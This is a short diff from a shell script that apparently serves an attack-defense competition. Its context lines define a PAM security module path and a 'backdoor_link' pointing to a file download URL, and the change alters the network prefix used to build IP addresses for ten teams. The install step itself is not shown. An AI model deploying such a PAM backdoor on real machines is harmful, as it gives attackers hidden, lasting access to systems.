@@ -8,7 +8,7 @@ path_to_pam="/lib/x86_64-linux-gnu/security"
 backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
 
 create_IPs() {
-    network_id="1.2"
+    network_id="1.1"
     number_of_teams=10
     host_ids=(1 2 3)
     for ((team=1; team<=number_of_teams; team++)); do
